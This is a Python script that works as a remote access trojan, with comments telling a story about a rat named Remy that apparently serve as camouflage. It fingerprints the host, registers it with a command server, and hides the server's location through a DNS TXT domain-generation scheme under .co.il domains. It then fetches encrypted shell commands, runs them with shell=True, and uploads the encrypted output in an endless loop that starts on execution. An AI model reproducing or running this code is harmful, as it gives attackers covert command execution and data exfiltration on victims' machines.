#!/usr/bin/python3
import hashlib
import re
import uuid
from datetime import datetime
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import requests
import subprocess
import time
import json
import os
import base64
import tempfile
import dns.resolver
import platform

DEBUG_MODE = False

# Our story begins with Remy. Remy the rat was no ordinary rodent. While his brothers scurried through alleyways in search of
def query_txt_record(domain):
    try:
        # Query the TXT records for the domain
        answers = dns.resolver.resolve(domain, 'TXT')
        for rdata in answers:
            for txt_string in rdata.strings:
                return txt_string.decode('utf-8').strip()
    except:
        return None

# scraps, Remy dreamed of flavors: the tang of aged cheese, the warmth of fresh bread, the zing of
def load_commands_outputs_encryption_public_key():
    public_key_b64 = "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2MEkwVm54d08yYVk5eVp4WDRPTAppN24wS3llUnh0cUdRb3J5S1J2TCt4dE1EQk00dHMxdzQvcitWQlVERjZ2MkdySXFRN0JEMW9FY3RVdys1dHRhCjN2M1FKVXVsZU9hVFhJVG1VNU5kMlFRRi9PMDhYSG9nMU9kK04ySllxaFVQWldFYUJkdmJzbTcrcU14endaekIKaUM5VHVKVEtpNjJnbDJkVUJXNk1INEEzbnQ0N040Tzd2TS9hc1duWlBndWJ6OWppdTk1NkpqYk4zdThycWFpbwp4SFkxSmFyOGRCZHJkRGRoelpsOWZYWEVQSHFVWkcySXl1K1RQVC8vUlQ4SWxUL1J5eTQveVl1V2treHhrQ1VPClprQkd5NFpPekZ6TGdvT0NWLytvVnlrVTNFUUV4K0I5WjF3RURmdlF5OUxyWVVsNm9oNCthbDIvYmpwRDRCVmcKZXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"
    public_key = serialization.load_pem_public_key(base64.b64decode(public_key_b64))
    return public_key

# herbs. He had a gift—a nose that could detect even the subtlest notes in a dish. But his culinary
def load_commands_list_decryption_private_key():
    private_key_b64 = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb0FJQkFBS0NBUUVBdk1YUG01NnNKSHpvcmNubnNZM3RJaXBqWWkyY01oOU16ZlhVZFBsQ3VQV29BcVRCCmdmTzMzQkpZa2s0QjVUdDFLTDZjTk1SZXkxSVRrc1FMNUJDd0NiT01QSjZBc0tKQmV3MHdCSnY3YTR0UkdkZUkKQU9BZ29QekJCc201VFgxN0NCb0d3bmFvMmtTemZ4bStBVVFZWC9aZXA3d084YzVqc0dvZlFKTzRweldUd1gyZAo3c0ozR0p1Z1piK2VzSGtsTkd5R21iNU5MUVFTNDR4bXNzQ0tROEtPSVlkbjN5aDN1MUhlVytMNjJPdmNsNFU5CnJrT1ZpUmp4SEEvbUpabU4ySU9FK1ZhYmlacGRxU2M3emdBbTh2Skg2OGhuY09ZanBYdVVIdnFRc29FUzVqWkUKZkc2T2NtdTEyQVJuUG5WWVExdTRvR2NEanVFeTh4bjg4MnZQOFFJREFRQUJBb0gvWGJpazJsR2dKYkNyQ0FQcApVU1EvU3AyTnVoY2VLSkV1ZHhNVjZEQ2xvdnVISWNqZDQ0MXAxTCt0YlBYbllXZ0tEN0NTM1RsdVBWQ2NNL1R1CldNeTlBQlFLMk5xbG8zTHJRdC9KUkJvdE9WRStwZUtvOEN5ODB6Q3AyRFRvZmtPMHVBUXo4SXVTci81cjdHSEIKMmtWMG9XTmphQmJjaDhxamdLWDhSSk41TTRvKzljdUNpOW4vK3VwUnpLTUR2ODJlM3hMeFJwcWQvUDRCcURBaApLZFd6WE91c3NFUEViYlhYRlE4RC9RVnBKaW5EYmRSN0FoUlVDNEc2MW9yK1pTbkNmL1phaVQydWRXKzRtWkw2CjF0TnlTdmZuY2VncHM3S1RYY0tLdnhzM1Z4clJGUkZ0OWxzUjA0SUs5NTBVUVBiY2VSMGs1M2MyQktaelM2a0MKMkE3cEFvR0JBTlk3WERLa0N0dTVpK01weVc1NXF3S1IwaStmTTM2SVNzZzgzMXluK01pNU80UGVwTS9RdlBueApnWVRTY0FkUmM5VVdzQlowUEdLNjVkSXNEbGtMZG5nbFhSdGI3clpjTk1TNUZRWFpqMzhsQjAvRjFQY3JXTUgyCnpDWUtVYVlzKy94MFBCOXpSN2REMG9kZlpBWG1BYUEyOHFQbmQxYU53cEdjYm9JamF6Sk5Bb0dCQU9HVHZwV0IKbEhlb0pSY0pTdlRURVhnV09nanVLWW1TeDJiQUVNUnpMNDdKN2twK29HckFVTVFZK1FwSkg1RVl2aGpYUU9SSAptby9QaWZ0bDQ2MTBEanB1bjhJOXZuZ0NxUnpLMFpqU3lyZXRxVkJYZWl1U0s0bldTdWdnUHFTODNmKzJGaDRnCldCK0czUjhERmxFWXQ1RGwvWDFzTFVkU1hsZFRvSmNBbXY0MUFvR0FGY1ZLaFVydVg0M25qVm85d2lCVEpKdTEKQkdubFRjS0Q5djFZcFkzY1ZtbWNocllsZ1lqdzYyV0RoLy9xcXBPNGRic3NnZHVtRjFKdThJRFJwSExwd3lQbwo1bExkVzJMYmFmSjFGSGNiZ2d3OVJmb1F2bDJGVTVERkJraWVLNGord3BUOVZ5VGI4Ti9Qa1RvOGErMEgxVVJBClBDL1ZqTkl6SjZFQ0NlK1hnVEVDZ1lCamhYMkdGSDllTTA3NTFOMi9HZ2dSQlMxaGwwRzRNb3ZLNTEzK2JodEQKVWcvUnlnQVlXUFRKTDROZ2FGYUcrM1dUSEJURElsd3NxcEhqMmxZU3hxc29XSG9maG9Jc0RIQjBCWDluZjBoMAp0U2VJRExBWDNRdGNhckR0ckp3MnJpVDdsbWczcm1seXIxdUxQUjl4ZEFnNDQxOXRJSGJ4aW9PWTM0cHdWSklOCktRS0JnQ3g0eDBQRkFKd09qWUVHeUtKbHhFWXJ6WUNZa2x6WFdHcnhKOGV3YXFRYTNBMkVwK0kyZUI3ZUZ4YncKN3c0K3NwUVE3MXpvak5PV2EvbDZoZmtmM1ptOUdPalJOdDhvc3RrYlBLckVjT292dTRDODg3TkUxamR4VDY1cwpBbFZIRXdQSlRUS3R0b2UwcDlVeUFiTkFiWVk5dElmSDIyV1VSN3U4ZHpDQnFUaXcKLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0="
    private_key = serialization.load_pem_private_key(base64.b64decode(private_key_b64), password=None)
    return private_key

# aspirations were a laughable dream in the world of rats, where survival meant stealing what you could
def decrypt_with_private_key(private_key, ciphertext):
    ciphertext_json = json.loads(base64.b64decode(ciphertext))
    encrypted_key = base64.b64decode(ciphertext_json["key"])
    encrypted_iv = base64.b64decode(ciphertext_json["iv"])
    ciphertext_bytes = base64.b64decode(ciphertext_json["ciphertext"])

    aes_key = private_key.decrypt(
        encrypted_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    aes_iv = private_key.decrypt(
        encrypted_iv,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(aes_iv))
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext_bytes)

    return plaintext

# One evening, as twilight painted the Parisian rooftops in hues of gold, Remy followed the aroma of
def encrypt_with_public_key(public_key, plaintext):
    aes_key = os.urandom(32)  # 256-bit key
    iv = os.urandom(16)       # 128-bit IV

    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext.encode('utf-8')) + encryptor.finalize()

    encrypted_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    encrypted_iv = public_key.encrypt(
        iv,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    result = {
        "key": base64.b64encode(encrypted_key).decode(),
        "iv": base64.b64encode(encrypted_iv).decode(),
        "ciphertext": base64.b64encode(ciphertext).decode()
    }
    return base64.b64encode(json.dumps(result).encode()).decode()

# something extraordinary. It led him to a cozy bistro, where a young chef struggled in the kitchen.
def build_command_result_object(my_pub_ip, command_id, exit_code, user=None, time_executed=None, stdout=None, stderr=None, exception=None):
    res_obj = {
        "my_pub_ip": my_pub_ip,
        "command_id": command_id,
        "exit_code": exit_code,
        "platform": platform.system(),
        "release": platform.release(),
        "stdout": None,
        "stderr": None,
        "time_executed": None,
        "user": None,
        "exception": None
    }
    if stdout is not None:
        res_obj["stdout"] = stdout.decode("utf8")
    if stderr is not None:
        res_obj["stderr"] = stderr.decode("utf8")
    if exception is not None:
        res_obj["exception"] = str(exception)
    if user is None:
        res_obj["user"] = os.getlogin()
    else:
        res_obj["user"] = user
    if time_executed is None:
        res_obj["time_executed"] = time.time()
    else:
        res_obj["time_executed"] = time_executed

    return res_obj

# Curious, Remy crept closer, perched above the pots and pans. He watched as the chef botched a
def report_command_result(my_id, public_key, command_id, report_obj, target_url):
    result_file_url = os.path.join(target_url, f"{my_id}={command_id}.98909256ab4211ef92504355150642b7")
    response = requests.put(result_file_url, data=encrypt_with_public_key(public_key, json.dumps(report_obj)))
    return response.status_code == 200

# simple soup, tossing random ingredients into the pot. Unable to bear it, Remy darted down, adjusted
def mark_command_as_executed(command, commands_executed, executed_commands_list_filename):
    commands_executed.append(command["id"])

    list_filename = os.path.join(tempfile.gettempdir(), executed_commands_list_filename)
    try:
        with open(list_filename, "a") as list_file:
            list_file.writelines([
                command["id"]
            ])
    except:
        pass

# the seasonings, and stirred. The soup was a masterpiece.
def load_commands_executed(executed_commands_list_filename):
    list_filename = os.path.join(tempfile.gettempdir(), executed_commands_list_filename)
    try:
        with open(list_filename, "r") as list_file:
            file_lines = list_file.readlines()
            my_id = file_lines[0]
            return my_id.strip(), list(dict.fromkeys(file_lines[1:]))
    except:
        my_id = str(uuid.uuid4())
        try:
            with open(list_filename, "w") as list_file:
                list_file.write(my_id + "\n")
        except:
            pass
        return my_id.strip(), []


# When the chef discovered Remy, there was a moment of shock—then understanding. Together, they
def decide_on_root_dns_record(my_pub_ip):
    root_dns_record = ""

    words_filename = os.path.abspath(__file__)
    used_root_dns_records = ["f9367e88-ab2c-11ef-a3a5-973b07fbf7d2.artifex.co.il"]
    used_root_dns_records_filename = os.path.join(tempfile.gettempdir(), "~~" + hashlib.sha256(my_pub_ip.encode()).hexdigest())
    try:
        with open(used_root_dns_records_filename) as used_root_dns_records_file:
            used_root_dns_records = used_root_dns_records + used_root_dns_records_file.readlines()
    except:
        pass

    words_list = []
    with open(words_filename) as words_file:
        words_text_raw = words_file.read().lower()
        words_text_raw = re.sub(r'[/\\_-]]', ' ', words_text_raw)
        words_text_raw = re.sub('[^a-z]', ' ', words_text_raw)
        words_text_raw = re.sub(r'\s+', ' ', words_text_raw)
        words_list = words_text_raw.strip().split(' ')

    root_dns_record = words_list[datetime.now().day * datetime.now().month % len(words_list)] + "." + words_list[
        (datetime.now().month * datetime.now().year) % len(words_list)] + str((datetime.now().month * datetime.now().year) % len(words_list)) + ".co.il"
    root_dns_record_valid = query_txt_record(root_dns_record) is not None
    used_root_dns_records_idx = len(used_root_dns_records) - 1
    while not root_dns_record_valid and used_root_dns_records_idx >= 0:
        root_dns_record = used_root_dns_records[used_root_dns_records_idx]
        root_dns_record_valid = query_txt_record(root_dns_record) is not None
        used_root_dns_records_idx -= 1

    if root_dns_record_valid and root_dns_record not in used_root_dns_records:
        used_root_dns_records += root_dns_record
        with open(used_root_dns_records_filename, "w") as used_root_dns_records_file:
            for used_root_dns_record in used_root_dns_records:
                used_root_dns_records_file.write(used_root_dns_record + "\n")

    return root_dns_record

# became an unlikely team. Remy guided the chef with precise nods and squeaks, creating dishes that
def main():
    my_pub_ip = None
    while my_pub_ip is None:
        try:
            my_pub_ip = requests.get("https://ifconfig.me").text
        except:
            pass
    sleep_time = 60
    executed_commands_list_filename = "~" + hashlib.sha256(my_pub_ip.encode()).hexdigest()
    my_id, commands_executed = load_commands_executed(executed_commands_list_filename)
    while True:
        try:
            dns_pointer_record = decide_on_root_dns_record(my_pub_ip)
            root_url = query_txt_record(dns_pointer_record)
            commands_bucket_url = os.path.join(root_url, my_id + "-cmds")
            commands_outputs_encryption_public_key = load_commands_outputs_encryption_public_key()
            commands_list_decryption_private_key = load_commands_list_decryption_private_key()
            register_to_rats_cluster(my_id, my_pub_ip, root_url)
            if DEBUG_MODE: print(f"Getting commands from {commands_bucket_url}...")
            commands = requests.get(commands_bucket_url)
            if commands.status_code == 200:
                commands_list_decrypted = decrypt_with_private_key(commands_list_decryption_private_key, commands.text)
                commands_list = json.loads(commands_list_decrypted.decode())
                if DEBUG_MODE: print(f"Received {len(commands_list)} commands to run...")
                for command in commands_list:
                    if command["id"] not in commands_executed and command["platform"] == platform.system():
                        try:
                            if DEBUG_MODE: print(f"Running the command {command['command']} ({command['id']})...")
                            command_res = subprocess.run(command["command"], cwd=command["workdir"], shell=True,
                                                         stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                            command_res_obj = build_command_result_object(
                                my_pub_ip=my_pub_ip,
                                command_id=command["id"],
                                exit_code=command_res.returncode,
                                user=os.getlogin(),
                                time_executed=time.time(),
                                stdout=command_res.stdout,
                                stderr=command_res.stderr
                            )
                        except Exception as ex:
                            command_res_obj = build_command_result_object(
                                my_pub_ip=my_pub_ip,
                                command_id=command["id"],
                                exit_code=-1,
                                user=os.getlogin(),
                                time_executed=time.time(),
                                stdout=None,
                                stderr=None,
                                exception=ex
                            )
                        if report_command_result(my_id, commands_outputs_encryption_public_key, command["id"], command_res_obj, command["report_results_to"]):
                            mark_command_as_executed(command, commands_executed, executed_commands_list_filename)
                        else:
                            if DEBUG_MODE: print(f"Failed to report execution results to {command['report_results_to']} for my_id:{my_id}, command_id:{command['id']}")
                    else:
                        if DEBUG_MODE: print(f"Command {command['id']} was already executed. Skipped.")
            else:
                if DEBUG_MODE: print(f"Failed to get a list of commands. HTTP status code is {commands.status_code}")
        except Exception as ex:
            if DEBUG_MODE: print(f"Exception occurred: {ex}")
            raise
        time.sleep(sleep_time)


def register_to_rats_cluster(my_id, my_pub_ip, root_url):
    try:
        reg_url = os.path.join(root_url, "registrations", str(my_id) + ".5ae9c92eaf5011efb98f83b6693403d8")
        requests.put(reg_url, data=json.dumps({
            "my_id": str(my_id),
            "my_pub_ip": my_pub_ip,
            "platform": platform.system(),
            "release": platform.release(),
            "user": os.getlogin(),
            "time_registered": time.time()
        }).encode())
    except:
        pass


# enchanted diners. In the bistro's kitchen, Remy found his place—not just as a rat, but as a chef who proved dreams could
# transcend even the smallest of creatures.
main()
